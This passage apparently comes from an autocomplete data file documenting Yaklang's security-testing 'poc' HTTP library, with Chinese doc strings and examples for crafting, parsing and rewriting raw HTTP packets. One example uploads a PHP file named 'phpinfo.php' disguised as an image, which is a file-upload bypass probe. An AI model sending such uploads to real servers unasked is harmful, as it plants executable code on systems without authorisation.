              'Websocket(raw any, opts ...PocConfigOption) (rsp []byte, req []byte, err error)  doc:Websocket 实际上等价于`poc.HTTP(..., poc.websocket(true))`，用于快速发送请求并建立websocket连接并且返回原始响应报文，原始请求报文以及错误\n\nExample:\n```\nrsp, req, err = poc.Websocket(`GET / HTTP/1.1\nConnection: Upgrade\nUpgrade: websocket\nSec-Websocket-Version: 13\nSec-Websocket-Extensions: permessage-deflate; client_max_window_bits\nHost: echo.websocket.events\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7\nSec-Websocket-Key: L31R1As+71fwuXqhwhABuA==`,\n\n\tpoc.proxy("http://127.0.0.1:7890"), poc.websocketFromServer(func(rsp, cancel) {\n\t\t    dump(rsp)\n\t\t}), poc.websocketOnClient(func(c) {\n\t\t    c.WriteText("123")\n\t\t})\n\n)\ntime.Sleep(100)\n```\n',
          },
          {
            functionName: "Split(${1:raw /*type: []byte*/}, ${2:hook...})",
            document: "",
            definitionStr:
              'Split(raw []byte, hook ...func(line string)) (headers string, body []byte)  doc:Split 切割 HTTP 报文，返回响应头和响应体，其第一个参数是原始HTTP报文，接下来可以接收零个到多个回调函数，其在每次解析到请求头时回调\n\nExample:\n```\npoc.Split(`POST / HTTP/1.1\nContent-Type: application/json\nHost: www.example.com\n\n{"key": "value"}`, func(header) {\ndump(header)\n})\n```\n',
          },
          {
            functionName:
              "ReplaceHTTPPacketUploadFile(${1:packet /*type: []byte*/}, ${2:fieldName /*type: string*/}, ${3:fileName /*type: string*/}, ${4:fileContent}, ${5:contentType...})",
            document: "",
            definitionStr:
              'ReplaceHTTPPacketUploadFile(packet []byte, fieldName string, fileName string, fileContent any, contentType ...string) []byte  doc:ReplaceHTTPPacketUploadFile 是一个辅助函数，用于改变请求报文，替换请求体中的上传的文件，其中第一个参数为原始请求报文，第二个参数为表单名，第三个参数为文件名，第四个参数为文件内容，第五个参数是可选参数，为文件类型(Content-Type)，如果表单名不存在则会增加\n\nExample:\n```\n_, raw, _ = poc.ParseUrlToHTTPRequestRaw("POST", "https://pie.dev/post")\npoc.ReplaceHTTPPacketUploadFile(raw, "file", "phpinfo.php", "<?php phpinfo(); ?>", "image/jpeg")) // 添加POST请求表单，其文件名为phpinfo.php，内容为<?php phpinfo(); ?>，文件类型为image/jpeg\n```\n',
          },
          {
            functionName:
              "ReplaceHTTPPacketQueryParam(${1:packet /*type: []byte*/}, ${2:key /*type: string*/}, ${3:value /*type: string*/})",
            document: "",
            definitionStr:
              'ReplaceHTTPPacketQueryParam(packet []byte, key string, value string) []byte  doc:ReplaceHTTPPacketQueryParam 是一个辅助函数，用于改变请求报文，修改GET请求参数，如果不存在则会增加\n\nExample:\n```\n_, raw, _ = poc.ParseUrlToHTTPRequestRaw("GET", "https://pie.dev/get")\npoc.ReplaceHTTPPacketQueryParam(raw, "a", "b") // 添加GET请求参数a，值为b\n```\n',
          },
          {
            functionName:
              "ReplaceHTTPPacketPostParam(${1:packet /*type: []byte*/}, ${2:key /*type: string*/}, ${3:value /*type: string*/})",
            document: "",
            definitionStr:
              'ReplaceHTTPPacketPostParam(packet []byte, key string, value string) []byte  doc:ReplaceHTTPPacketPostParam 是一个辅助函数，用于改变请求报文，修改POST请求参数，如果不存在则会增加\n\nExample:\n```\n_, raw, _ = poc.ParseUrlToHTTPRequestRaw("POST", "https://pie.dev/post")\npoc.ReplaceHTTPPacketPostParam(raw, "a", "b") // 添加POST请求参数a，值为b\n```\n',
          },
          {
            functionName:
              "ReplaceHTTPPacketPath(${1:packet /*type: []byte*/}, ${2:p /*type: string*/})",
            document: "",
            definitionStr:
              'ReplaceHTTPPacketPath(packet []byte, p string) []byte  doc:ReplaceHTTPPacketPath 是一个辅助函数，用于改变请求报文，修改请求路径\n\nExample:\n```\npoc.ReplaceHTTPPacketPath(poc.BasicRequest(), "/get") // 修改请求路径为/get\n```\n',
          },
          {
            functionName:
              "ReplaceHTTPPacketMethod(${1:packet /*type: []byte*/}, ${2:newMethod /*type: string*/})",
            document: "",
            definitionStr:
              'ReplaceHTTPPacketMethod(packet []byte, newMethod string) []byte  doc:ReplaceHTTPPacketMethod 是一个辅助函数，用于改变请求报文，修改请求方法\n\nExample:\n```\npoc.ReplaceHTTPPacketMethod(poc.BasicRequest(), "OPTIONS") // 修改请求方法为OPTIONS\n```\n',
          },
          {
            functionName:
              "ReplaceHTTPPacketJsonBody(${1:packet /*type: []byte*/}, ${2:jsonMap /*type: map[string]any*/})",
            document: "",
            definitionStr:
              'ReplaceHTTPPacketJsonBody(packet []byte, jsonMap map[string]any) []byte  doc:ReplaceHTTPPacketJsonBody 是一个辅助函数，用于改变 HTTP 报文，修改 HTTP 报文主体内容（ json 格式），第一个参数为原始 HTTP 报文，第二个参数为修改的报文主体内容（ map 对象）\n\nExample:\n```\npoc.ReplaceHTTPPacketJsonBody(poc.BasicRequest(), {"a":"b"}) // 修改请求体内容为{"a":"b"}\n```\n',
          },
          {
            functionName:
              "ReplaceHTTPPacketHost(${1:packet /*type: []byte*/}, ${2:host /*type: string*/})",
            document: "",
            definitionStr:
              'ReplaceHTTPPacketHost(packet []byte, host string) []byte  doc:ReplaceHTTPPacketHost 是一个辅助函数，用于改变请求报文，修改Host请求头，如果不存在则会增加，实际上是ReplaceHTTPPacketHeader("Host", host)的简写\n\nExample:\n```\n_, raw, _ = poc.ParseUrlToHTTPRequestRaw("GET", "https://yaklang.com")\npoc.ReplaceHTTPPacketHost(raw, "www.yaklang.com") // 修改Host请求头的值为 www.yaklang.com\n```\n',
          },
          {
            functionName:
              "ReplaceHTTPPacketHeader(${1:packet /*type: []byte*/}, ${2:headerKey /*type: string*/}, ${3:headerValue})",
            document: "",
            definitionStr:
              'ReplaceHTTPPacketHeader(packet []byte, headerKey string, headerValue any) []byte  doc:ReplaceHTTPPacketHeader 是一个辅助函数，用于改变请求报文，修改请求头，如果不存在则会增加\n\nExample:\n```\npoc.ReplaceHTTPPacketHeader(poc.BasicRequest(),"AAA", "BBB") // 修改AAA请求头的值为BBB，这里没有AAA请求头，所以会增加该请求头\n```\n',
          },
          {
            functionName:
              "ReplaceHTTPPacketFormEncoded(${1:packet /*type: []byte*/}, ${2:key /*type: string*/}, ${3:value /*type: string*/})",
            document: "",
            definitionStr:
              'ReplaceHTTPPacketFormEncoded(packet []byte, key string, value string) []byte  doc:ReplaceHTTPPacketFormEncoded 是一个辅助函数，用于改变请求报文，替换请求体中的表单，如果不存在则会增加\n\nExample:\n```\npoc.ReplaceHTTPPacketFormEncoded(`POST /post HTTP/1.1\nHost: pie.dev\nContent-Type: multipart/form-data; boundary=------------------------OFHnlKtUimimGcXvRSxgCZlIMAyDkuqsxeppbIFm\nContent-Length: 203\n\n--------------------------OFHnlKtUimimGcXvRSxgCZlIMAyDkuqsxeppbIFm\nContent-Disposition: form-data; name="aaa"\n\nbbb\n--------------------------OFHnlKtUimimGcXvRSxgCZlIMAyDkuqsxeppbIFm--`, "ccc", "ddd") // 替换POST请求表单，其中ccc为键，ddd为值\n```\n',
          },
          {
            functionName:
              "ReplaceHTTPPacketFirstLine(${1:packet /*type: []byte*/}, ${2:firstLine /*type: string*/})",
            document: "",
            definitionStr:
              'ReplaceHTTPPacketFirstLine(packet []byte, firstLine string) []byte  doc:ReplaceHTTPPacketFirstLine 是一个辅助，用于改变请求报文，修改第一行（即请求方法，请求路径，协议版本）\n\nExample:\n```\npoc.ReplaceHTTPPacketFirstLine(`GET / HTTP/1.1\nHost: Example.com\n`, "GET /test HTTP/1.1")) // 向 example.com 发起请求，修改请求报文的第一行，请求/test路径\n```\n',
          },
          {
            functionName:
              "ReplaceHTTPPacketCookies(${1:packet /*type: []byte*/}, ${2:m})",
            document: "",
            definitionStr:
              'ReplaceHTTPPacketCookies(packet []byte, m any) []byte  doc:ReplaceHTTPPacketCookies 是一个辅助函数，用于改变请求报文，修改Cookie请求头\n\nExample:\n```\npoc.ReplaceHTTPPacketCookies(poc.BasicRequest(), {"aaa":"bbb", "ccc":"ddd"}) // 修改cookie值为aaa=bbb;ccc=ddd\n```\n',
          },
          {
            functionName:
              "ReplaceHTTPPacketCookie(${1:packet /*type: []byte*/}, ${2:key /*type: string*/}, ${3:value})",
            document: "",
            definitionStr:
              'ReplaceHTTPPacketCookie(packet []byte, key string, value any) []byte  doc:ReplaceHTTPPacketCookie 是一个辅助函数，用于改变请求报文，修改Cookie请求头中的值，如果不存在则会增加\n\nExample:\n```\npoc.ReplaceHTTPPacketCookie(poc.BasicRequest(), "aaa", "bbb") // 修改cookie值，由于这里没有aaa的cookie值，所以会增加\n```\n',
          },
          {
            functionName:
              "ReplaceHTTPPacketBody(${1:packet /*type: []byte*/}, ${2:body /*type: []byte*/})",
            document: "",
            definitionStr:
              'ReplaceHTTPPacketBody(packet []byte, body []byte) []byte  doc:ReplaceHTTPPacketBody 是一个辅助函数，用于改变 HTTP 报文，修改 HTTP 报文主体内容，第一个参数为原始 HTTP 报文，第二个参数为修改的报文主体内容\n\nExample:\n```\npoc.ReplaceHTTPPacketBody(poc.BasicRequest(), "a=b") // 修改请求体内容为a=b\n```\n',
          },
          {
            functionName:
              "ReplaceHTTPPacketBasicAuth(${1:packet /*type: []byte*/}, ${2:username /*type: string*/}, ${3:password /*type: string*/})",
            document: "",
            definitionStr:
              'ReplaceHTTPPacketBasicAuth(packet []byte, username string, password string) []byte  doc:ReplaceHTTPPacketBasicAuth 是一个辅助函数，用于改变请求报文，修改Authorization请求头为基础认证的密文，如果不存在则会增加，实际上是ReplaceHTTPPacketHeader("Authorization", codec.EncodeBase64(username + ":" + password))的简写\n\nExample:\n```\n_, raw, _ = poc.ParseUrlToHTTPRequestRaw("GET", "https://pie.dev/basic-auth/admin/password")\npoc.ReplaceHTTPPacketBasicAuth(raw, "admin", "password") // 修改Authorization请求头\n```\n',
          },
          {
            functionName:
              "ReplaceBody(${1:raw /*type: []byte*/}, ${2:body /*type: []byte*/}, ${3:chunk /*type: bool*/})",
            document: "",
            definitionStr:
              'ReplaceBody(raw []byte, body []byte, chunk bool) (newHTTPRequest []byte)  doc:ReplaceBody 将原始 HTTP 请求报文中的 body 替换为指定的 body，并指定是否为 chunked，返回新的 HTTP 请求报文\n\nExample:\n```\npoc.ReplaceBody(`POST / HTTP/1.1\nHost: example.com\nContent-Length: 11\n\nhello world`, "hello yak", false)\n```\n',
          },
          {
            functionName:
              "ReplaceAllHTTPPacketQueryParamsWithoutEscape(${1:packet /*type: []byte*/}, ${2:values /*type: map[string]string*/})",
            document: "",
            definitionStr:
              'ReplaceAllHTTPPacketQueryParamsWithoutEscape(packet []byte, values map[string]string) []byte  doc:ReplaceAllHTTPPacketQueryParamsWithoutEscape 是一个辅助函数，用于改变请求报文，修改所有 GET 请求参数，如果不存在则会增加，其接收一个 map[string]string 类型的参数，其中 key 为请求参数名，value 为请求参数值\n\n与 poc.ReplaceAllHTTPPacketQueryParams 类似，但是不会将参数值进行转义\n\nExample:\n```\npoc.ReplaceAllHTTPPacketQueryParamsWithoutEscape(poc.BasicRequest(), {"a":"b", "c":"d"}) // 添加GET请求参数a，值为b，添加GET请求参数c，值为d\n```\n',
          },
          {
            functionName:
              "ReplaceAllHTTPPacketQueryParams(${1:packet /*type: []byte*/}, ${2:values /*type: map[string]string*/})",
            document: "",
            definitionStr:
              'ReplaceAllHTTPPacketQueryParams(packet []byte, values map[string]string) []byte  doc:ReplaceAllHTTPPacketQueryParams 是一个辅助函数，用于改变请求报文，修改所有 GET 请求参数，如果不存在则会增加，其接收一个 map[string]string 类型的参数，其中 key 为请求参数名，value 为请求参数值\n\nExample:\n```\npoc.ReplaceAllHTTPPacketQueryParams(poc.BasicRequest(), {"a":"b", "c":"d"}) // 添加GET请求参数a，值为b，添加GET请求参数c，值为d\n```\n',
          },
          {
            functionName:
              "ReplaceAllHTTPPacketPostParamsWithoutEscape(${1:packet /*type: []byte*/}, ${2:values /*type: map[string]string*/})",
            document: "",
            definitionStr:
              'ReplaceAllHTTPPacketPostParamsWithoutEscape(packet []byte, values map[string]string) []byte  doc:ReplaceAllHTTPPacketPostParamsWithoutEscape 是一个辅助函数，用于改变请求报文，修改所有 POST 请求参数，如果不存在则会增加，其接收一个 map[string]string 类型的参数，其中 key 为 POST 请求参数名，value 为 POST 请求参数值\n\n与 poc.ReplaceAllHTTPPacketPostParams 类似，但是不会将参数值进行转义\n\n\n\nExample:\n```\n_, raw, _ = poc.ParseUrlToHTTPRequestRaw("POST", "https://pie.dev/post")\npoc.ReplaceAllHTTPPacketPostParamsWithoutEscape(raw, {"a":"b", "c":"d"}) // 添加POST请求参数a，值为b，POST请求参数c，值为d\n```\n',
          },
          {
            functionName:
              "ReplaceAllHTTPPacketPostParams(${1:packet /*type: []byte*/}, ${2:values /*type: map[string]string*/})",
            document: "",
            definitionStr:
              'ReplaceAllHTTPPacketPostParams(packet []byte, values map[string]string) []byte  doc:ReplaceAllHTTPPacketPostParams 是一个辅助函数，用于改变请求报文，修改所有 POST 请求参数，如果不存在则会增加，其接收一个 map[string]string 类型的参数，其中 key 为 POST 请求参数名，value 为 POST 请求参数值\n\nExample:\n```\n_, raw, _ = poc.ParseUrlToHTTPRequestRaw("POST", "https://pie.dev/post")\npoc.ReplaceAllHTTPPacketPostParams(raw, {"a":"b", "c":"d"}) // 添加POST请求参数a，值为b，POST请求参数c，值为d\n```\n',
          },
          {
            functionName: "Post(${1:urlStr /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Post(urlStr string, opts ...PocConfigOption) (rspInst *lowhttp.LowhttpResponse, reqInst *http.Request, err error)  doc:Post 向指定 URL 发送 POST 请求并且返回响应结构体，请求结构体以及错误，它的第一个参数是 URL 字符串，接下来可以接收零个到多个请求选项，用于对此次请求进行配置，例如对设置超时时间，或者修改请求报文等\n\n关于结构体中的可用字段和方法可以使用 desc 函数进行查看\n\nExample:\n```\npoc.Post("https://yaklang.com", poc.https(true)) // 向yaklang.com发送一个基于HTTPS协议的POST请求\ndesc(rsp) // 查看响应结构体中的可用字段\n```\n',
          },
          {
            functionName:
              "ParseUrlToHTTPRequestRaw(${1:method /*type: string*/}, ${2:i})",
            document: "",
            definitionStr:
              'ParseUrlToHTTPRequestRaw(method string, i any) (isHttps bool, req []byte, err error)  doc:ParseUrlToHTTPRequestRaw 将URL解析为原始 HTTP 请求报文，返回是否为 HTTPS，原始请求报文与错误\n\nExample:\n```\nishttps, raw, err = poc.ParseUrlToHTTPRequestRaw("GET", "https://yaklang.com")\n```\n',
          },
          {
            functionName:
              "ParseMultiPartFormWithCallback(${1:req /*type: []byte*/}, ${2:callback /*type: func(part *multipart.Part)*/})",
            document: "",
            definitionStr:
              'ParseMultiPartFormWithCallback(req []byte, callback func(part *multipart.Part)) (err error)  doc:ParseMultiPartFormWithCallback 是一个辅助函数，用于尝试解析请求报文体中的表单并进行回调\n\nExample:\n```\npoc.ParseMultiPartFormWithCallback(`POST /post HTTP/1.1\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\nHost: pie.dev\n\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name="a"\n\n1\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name="b"\n\n2\n------WebKitFormBoundary7MA4YWxkTrZu0gW--`, func(part) {\ncontent = string(io.ReadAll(part)~)\nprintln(part.FileName(), part.FormName(), content)\n})\n```\n',
          },
          {
            functionName: "ParseBytesToHTTPResponse(${1:res /*type: []byte*/})",
            document: "",
            definitionStr:
              'ParseBytesToHTTPResponse(res []byte) (rspInst *http.Response, err error)  doc:ParseBytesToHTTPResponse 将字节数组解析为 HTTP 响应\n\nExample:\n```\nres, err := str.ParseBytesToHTTPResponse(b"HTTP/1.1 200 OK\\r\\nContent-Length: 2\\r\\n\\r\\nok")\n```\n',
          },
          {
            functionName: "ParseBytesToHTTPRequest(${1:raw /*type: []byte*/})",
            document: "",
            definitionStr:
              'ParseBytesToHTTPRequest(raw []byte) (reqInst *http.Request, err error)  doc:ParseBytesToHTTPRequest 将字节数组解析为 HTTP 请求\n\nExample:\n```\nreq, err := str.ParseBytesToHTTPRequest(b"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n")\n```\n',
          },
          {
            functionName: "Options(${1:urlStr /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Options(urlStr string, opts ...PocConfigOption) (rspInst *lowhttp.LowhttpResponse, reqInst *http.Request, err error)  doc:Options 向指定 URL 发送 OPTIONS 请求并且返回响应结构体，请求结构体以及错误，它的第一个参数是 URL 字符串，接下来可以接收零个到多个请求选项，用于对此次请求进行配置，例如对设置超时时间，或者修改请求报文等\n\n关于结构体中的可用字段和方法可以使用 desc 函数进行查看\n\nExample:\n```\npoc.Options("https://yaklang.com", poc.https(true)) // 向yaklang.com发送一个基于HTTPS协议的Options请求\ndesc(rsp) // 查看响应结构体中的可用字段\n```\n',
          },
          {
            functionName: "IsResponse(${1:raw})",
            document: "",
            definitionStr:
              'IsResponse(raw any) (isHTTPResponse bool)  doc:IsResp 判断传入的数据是否为 HTTP 响应报文\n\nExample:\n```\npoc.IsResp(b"HTTP/1.1 200 OK\\r\\nContent-Length: 2\\r\\n\\r\\nok") // true\n```\n',
          },
          {
            functionName: "Head(${1:urlStr /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Head(urlStr string, opts ...PocConfigOption) (rspInst *lowhttp.LowhttpResponse, reqInst *http.Request, err error)  doc:Head 向指定 URL 发送 HEAD 请求并且返回响应结构体，请求结构体以及错误，它的第一个参数是 URL 字符串，接下来可以接收零个到多个请求选项，用于对此次请求进行配置，例如对设置超时时间，或者修改请求报文等\n\n关于结构体中的可用字段和方法可以使用 desc 函数进行查看\n\nExample:\n```\npoc.Head("https://yaklang.com", poc.https(true)) // 向yaklang.com发送一个基于HTTPS协议的HEAD请求\ndesc(rsp) // 查看响应结构体中的可用字段\n```\n',
          },
          {
            functionName:
              "HTTPRequestToCurl(${1:https /*type: bool*/}, ${2:raw})",
            document: "",
            definitionStr:
              'HTTPRequestToCurl(https bool, raw any) (curlCommand string)  doc:HTTPRequestToCurl 尝试将 HTTP 请求报文转换为curl命令。第一个参数为是否使用HTTPS，第二个参数为HTTP请求报文，其返回值为string，即转换后的curl命令\n\nExample:\n```\npoc.HTTPRequestToCurl(true, "GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n")\n```\n',
          },
          {
            functionName: "HTTPPacketForceChunked(${1:raw /*type: []byte*/})",
            document: "",
            definitionStr:
              "HTTPPacketForceChunked(raw []byte) []byte  doc:HTTPPacketForceChunked 将一个HTTP报文的body强制转换为chunked编码\n\nExample:\n```\npoc.HTTPPacketForceChunked(`POST / HTTP/1.1\nHost: example.com\nContent-Length: 11\n\nhello world`)\n```\n",
          },
          {
            functionName: "HTTPEx(${1:i}, ${2:opts...})",
            document: "",
            definitionStr:
              'HTTPEx(i any, opts ...PocConfigOption) (rspInst *lowhttp.LowhttpResponse, reqInst *http.Request, err error)  doc:HTTPEx 与 HTTP 类似，它发送请求并且返回响应结构体，请求结构体以及错误，它的第一个参数可以接收 []byte, string, http.Request 结构体，接下来可以接收零个到多个请求选项，用于对此次请求进行配置，例如设置超时时间，或者修改请求报文等\n\n关于结构体中的可用字段和方法可以使用 desc 函数进行查看\n\nExample:\n```\nrsp, req, err = poc.HTTPEx(`GET / HTTP/1.1\\r\\nHost: www.yaklang.com\\r\\n\\r\\n`, poc.https(true), poc.replaceHeader("AAA", "BBB")) // 向yaklang.com发送一个基于HTTPS协议的GET请求，并且添加一个请求头AAA，它的值为BBB\ndesc(rsp) // 查看响应结构体中的可用字段\n```\n',
          },
          {
            functionName: "HTTP(${1:i}, ${2:opts...})",
            document: "",
            definitionStr:
              'HTTP(i any, opts ...PocConfigOption) (rsp []byte, req []byte, err error)  doc:HTTP 发送请求并且返回原始响应报文，原始请求报文以及错误，它的第一个参数可以接收 []byte, string, http.Request 结构体，接下来可以接收零个到多个请求选项，用于对此次请求进行配置，例如设置超时时间，或者修改请求报文等\n\nExample:\n```\npoc.HTTP("GET / HTTP/1.1\\r\\nHost: www.yaklang.com\\r\\n\\r\\n", poc.https(true), poc.replaceHeader("AAA", "BBB")) // yaklang.com发送一个基于HTTPS协议的GET请求，并且添加一个请求头AAA，它的值为BBB\n```\n',
          },
          {
            functionName:
              "GetUrlFromHTTPRequest(${1:scheme /*type: string*/}, ${2:packet /*type: []byte*/})",
            document: "",
            definitionStr:
              'GetUrlFromHTTPRequest(scheme string, packet []byte) (url string)  doc:GetUrlFromHTTPRequest 是一个辅助函数，用于获取请求报文中的URL，其返回值为string\n\nExample:\n```\npoc.GetUrlFromHTTPRequest("https", `GET /get HTTP/1.1\nContent-Type: application/json\nHost: pie.dev\n\n`) // 获取URL，这里会返回"https://pie.dev/get"\n```\n',
          },
          {
            functionName:
              "GetStatusCodeFromResponse(${1:packet /*type: []byte*/})",
            document: "",
            definitionStr:
              "GetStatusCodeFromResponse(packet []byte) (statusCode int)  doc:GetStatusCodeFromResponse 是一个辅助函数，用于获取响应报文中的状态码，其返回值为int\n\nExample:\n```\npoc.GetStatusCodeFromResponse(`HTTP/1.1 200 OK\nContent-Length: 5\n\nhello`) // 获取响应报文中的状态码，这里会返回200\n```\n",
          },
          {
            functionName:
              "GetHTTPRequestPathWithoutQuery(${1:packet /*type: []byte*/})",
            document: "",
            definitionStr:
              'GetHTTPRequestPathWithoutQuery(packet []byte) (path string)  doc:GetHTTPRequestPathWithoutQuery 是一个辅助函数，用于获取响应报文中的路径，返回值是 string，不包含 query\n\nExample:\n```\npoc.GetHTTPRequestPathWithoutQuery("GET /a/bc.html?a=1 HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\n") // /a/bc.html\n```\n',
          },
          {
            functionName: "GetHTTPRequestPath(${1:packet /*type: []byte*/})",
            document: "",
            definitionStr:
              'GetHTTPRequestPath(packet []byte) (path string)  doc:GetHTTPRequestPath 是一个辅助函数，用于获取响应报文中的路径，返回值是 string，包含 query\n\nExample:\n```\npoc.GetHTTPRequestPath("GET /a/bc.html?a=1 HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\n") // /a/bc.html?a=1\n```\n',
          },
          {
            functionName: "GetHTTPRequestMethod(${1:packet /*type: []byte*/})",
            document: "",
            definitionStr:
              'GetHTTPRequestMethod(packet []byte) (method string)  doc:GetHTTPRequestMethod 是一个辅助函数，用于获取请求报文中的请求方法，其返回值为string\n\nExample:\n```\npoc.GetHTTPRequestMethod(`GET /get HTTP/1.1\nContent-Type: application/json\nCookie: a=b; a=c; c=d\nHost: pie.dev\n\n`) // 获取请求方法，这里会返回"GET"\n```\n',
          },
          {
            functionName:
              "GetHTTPPacketQueryParam(${1:packet /*type: []byte*/}, ${2:key /*type: string*/})",
            document: "",
            definitionStr:
              'GetHTTPPacketQueryParam(packet []byte, key string) (paramValue string)  doc:GetHTTPPacketQueryParam 是一个辅助函数，用于获取请求报文中指定的GET请求参数，其返回值为string\n\nExample:\n```\npoc.GetHTTPPacketQueryParam(`GET /get?a=b&c=d HTTP/1.1\nContent-Type: application/json\nHost: pie.dev\n\n`, "a") // 获取GET请求参数a的值\n```\n',
          },
          {
            functionName:
              "GetHTTPPacketPostParam(${1:packet /*type: []byte*/}, ${2:key /*type: string*/})",
            document: "",
            definitionStr:
              'GetHTTPPacketPostParam(packet []byte, key string) (paramValue string)  doc:GetHTTPPacketPostParam 是一个辅助函数，用于获取请求报文中指定的POST请求参数，其返回值为string\n\nExample:\n```\npoc.GetHTTPPacketPostParam(`POST /post HTTP/1.1\nContent-Type: application/json\nCOntent-Length: 7\nHost: pie.dev\n\na=b&c=d`, "a") // 获取POST请求参数a的值\n```\n',
          },
          {
            functionName:
              "GetHTTPPacketHeadersFull(${1:packet /*type: []byte*/})",
            document: "",
            definitionStr:
              'GetHTTPPacketHeadersFull(packet []byte) (headers map[string][]string)  doc:GetHTTPPacketHeadersFull 是一个辅助函数，用于获取请求报文中所有请求头，其返回值为map[string][]string，这是因为请求头可能存在多个相同键名的值\n\nExample:\n```\npoc.GetHTTPPacketHeadersFull(`GET /get HTTP/1.1\nContent-Type: application/json\nCookie: a=b; a=c; c=d\nCookie: e=f\nHost: pie.dev\n\n`) // 获取所有请求头，这里会返回{"Content-Type": ["application/json"], "Cookie": []"a=b; a=c; c=d", "e=f"], "Host": ["pie.dev"]}\n```\n',
          },
          {
            functionName: "GetHTTPPacketHeaders(${1:packet /*type: []byte*/})",
            document: "",
            definitionStr:
              'GetHTTPPacketHeaders(packet []byte) (headers map[string]string)  doc:GetHTTPPacketHeaders 是一个辅助函数，用于获取请求报文中所有请求头，其返回值为map[string]string\n\nExample:\n```\npoc.GetHTTPPacketHeaders(`GET /get HTTP/1.1\nContent-Type: application/json\nCookie: a=b; a=c; c=d\nHost: pie.dev\n\n`) // 获取所有请求头，这里会返回{"Content-Type": "application/json", "Cookie": "a=b; a=c; c=d", "Host": "pie.dev"}\n```\n',
          },
          {
            functionName:
              "GetHTTPPacketHeader(${1:packet /*type: []byte*/}, ${2:key /*type: string*/})",
            document: "",
            definitionStr:
              'GetHTTPPacketHeader(packet []byte, key string) (header string)  doc:GetHTTPPacketHeader 是一个辅助函数，用于获取请求报文中指定的请求头，其返回值为string\n\nExample:\n```\npoc.GetHTTPPacketHeader(`GET /get HTTP/1.1\nContent-Type: application/json\nCookie: a=b; a=c; c=d\nHost: pie.dev\n\n`, "Content-Type") // 获取Content-Type请求头，这里会返回"application/json"\n```\n',
          },
          {
            functionName: "GetHTTPPacketFirstLine(${1:packet /*type: []byte*/})",
            document: "",
            definitionStr:
              'GetHTTPPacketFirstLine(packet []byte) (string, string, string)  doc:GetHTTPPacketFirstLine 是一个辅助函数，用于获取 HTTP 报文中第一行的值，其返回值为string，string，string\n\n在请求报文中，其三个返回值分别为：请求方法，请求URI，协议版本\n\n在响应报文中，其三个返回值分别为：协议版本，状态码，状态码描述\n\nExample:\n```\npoc.GetHTTPPacketFirstLine(`GET /get HTTP/1.1\nContent-Type: application/json\nCookie: a=b; a=c; c=d\nHost: pie.dev\n\n`) // 获取请求方法，请求URI，协议版本，这里会返回"GET", "/get", "HTTP/1.1"\n```\n',
          },
          {
            functionName:
              "GetHTTPPacketCookiesFull(${1:packet /*type: []byte*/})",
            document: "",
            definitionStr:
              'GetHTTPPacketCookiesFull(packet []byte) (cookies map[string][]string)  doc:GetHTTPPacketCookiesFull 是一个辅助函数，用于获取请求报文中所有Cookie值，其返回值为map[string][]string，这是因为Cookie可能存在多个相同键名的值\n\nExample:\n```\npoc.GetHTTPPacketCookiesFull(`GET /get HTTP/1.1\nContent-Type: application/json\nCookie: a=b; a=c; c=d\nHost: pie.dev\n\n`) // 获取所有Cookie值，这里会返回{"a":["b", "c"], "c":["d"]}\n```\n',
          },
          {
            functionName: "GetHTTPPacketCookies(${1:packet /*type: []byte*/})",
            document: "",
            definitionStr:
              'GetHTTPPacketCookies(packet []byte) (cookies map[string]string)  doc:GetHTTPPacketCookies 是一个辅助函数，用于获取请求报文中所有Cookie值，其返回值为map[string]string\n\nExample:\n```\npoc.GetHTTPPacketCookies(`GET /get HTTP/1.1\nContent-Type: application/json\nCookie: a=b; c=d\nHost: pie.dev\n\n`) // 获取所有Cookie值，这里会返回{"a":"b", "c":"d"}\n```\n',
          },
          {
            functionName:
              "GetHTTPPacketCookieValues(${1:packet /*type: []byte*/}, ${2:key /*type: string*/})",
            document: "",
            definitionStr:
              'GetHTTPPacketCookieValues(packet []byte, key string) (cookieValues []string)  doc:GetHTTPPacketCookieValues 是一个辅助函数，用于获取请求报文中Cookie值，其返回值为[]string，这是因为Cookie可能存在多个相同键名的值\n\nExample:\n```\npoc.GetHTTPPacketCookieValues(`GET /get HTTP/1.1\nContent-Type: application/json\nCookie: a=b; a=c\nHost: pie.dev\n\n`, "a") // 获取键名为a的Cookie值，这里会返回["b", "c"]\n```\n',
          },
          {
            functionName:
              "GetHTTPPacketCookieFirst(${1:packet /*type: []byte*/}, ${2:key /*type: string*/})",
            document: "",
            definitionStr:
              'GetHTTPPacketCookieFirst(packet []byte, key string) (cookieValue string)  doc:GetHTTPPacketCookieFirst 是一个辅助函数，用于获取请求报文中Cookie值，其返回值为string\n\nExample:\n```\npoc.GetHTTPPacketCookieFirst(`GET /get HTTP/1.1\nContent-Type: application/json\nCookie: a=b; c=d\nHost: pie.dev\n\n`, "a") // 获取键名为a的Cookie值，这里会返回"b"\n```\n',
          },
          {
            functionName:
              "GetHTTPPacketCookie(${1:packet /*type: []byte*/}, ${2:key /*type: string*/})",
            document: "",
            definitionStr:
              'GetHTTPPacketCookie(packet []byte, key string) (cookieValue string)  doc:GetHTTPPacketCookie 是一个辅助函数，用于获取请求报文中Cookie值，其返回值为string\n\nExample:\n```\npoc.GetHTTPPacketCookie(`GET /get HTTP/1.1\nContent-Type: application/json\nCookie: a=b; c=d\nHost: pie.dev\n\n`, "a") // 获取键名为a的Cookie值，这里会返回"b"\n```\n',
          },
          {
            functionName:
              "GetHTTPPacketContentType(${1:packet /*type: []byte*/})",
            document: "",
            definitionStr:
              "GetHTTPPacketContentType(packet []byte) (contentType string)  doc:GetHTTPPacketContentType 是一个辅助函数，用于获取请求报文中的Content-Type请求头，其返回值为string\n\nExample:\n```\npoc.GetHTTPPacketContentType(`POST /post HTTP/1.1\nContent-Type: application/json\nCOntent-Length: 7\nHost: pie.dev\n\na=b&c=d`) // 获取Content-Type请求头\n```\n",
          },
          {
            functionName: "GetHTTPPacketBody(${1:packet /*type: []byte*/})",
            document: "",
            definitionStr:
